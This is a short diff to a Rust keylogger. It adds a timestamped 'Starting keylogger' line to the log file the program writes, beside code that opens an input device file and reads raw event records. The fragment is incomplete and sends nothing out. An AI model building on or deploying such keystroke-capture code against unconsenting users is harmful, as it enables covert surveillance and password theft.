@@ -1,6 +1,7 @@
 extern crate getopts;
 extern crate env_logger;
 extern crate libc;
+extern crate chrono;
 
 #[macro_use]
 extern crate log;
@@ -40,7 +41,10 @@ fn main() {
 
     let mut log_file = OpenOptions::new().create(true).write(true).append(true).open(config.log_file)
         .unwrap_or_else(|e| panic!("{}", e));
+
     let mut device_file = File::open(&config.device_file).unwrap_or_else(|e| panic!("{}", e));
+
+    write!(log_file, "# Starting keylogger at {}\n", chrono::Local::now()).unwrap_or_else(|e| panic!("{}", e));
 
     // TODO: use the sizeof function (not available yet) instead of hard-coding 24.
     let mut buf: [u8; 24] = unsafe { mem::zeroed() };
